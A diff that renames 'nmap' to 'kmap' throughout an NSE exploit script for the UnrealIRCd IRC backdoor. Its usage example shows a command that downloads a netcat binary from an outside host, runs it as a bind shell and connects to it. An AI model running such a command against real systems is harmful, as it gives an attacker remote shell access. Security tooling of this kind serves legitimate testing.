@@ -1,5 +1,5 @@
 local comm = require "comm"
-local nmap = require "nmap"
+local kmap = require "kmap"
 local os = require "os"
 local irc = require "irc"
 local stdnse = require "stdnse"
@@ -15,9 +15,9 @@ this vulnerability (the output is never returned) we have no way of
 getting the output of the command. It can, however, be used to start a
 netcat listener as demonstrated here:
 <code>
-  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
+  $ kmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
   $ ncat -vv localhost 4444
-  Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )
+  Ncat: Version 5.30BETA1 ( https://kmap.org/ncat )
   Ncat: Connected to 127.0.0.1:4444.
   pwd
   /home/ron/downloads/Unreal3.2-bad
@@ -57,7 +57,7 @@ Reference:
 --
 
 author = {"Vlatko Kosturjak", "Ron Bowes"}
-license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+license = "Same as Kmap--See https://kmap.org/book/man-legal.html"
 categories = {"exploit", "intrusive", "malware", "vuln"}
 
 
@@ -65,7 +65,7 @@ portrule = irc.portrule
 
 
 action = function(host, port)
-  local socket = nmap.new_socket()
+  local socket = kmap.new_socket()
   local code, message
   local status, err
   local data
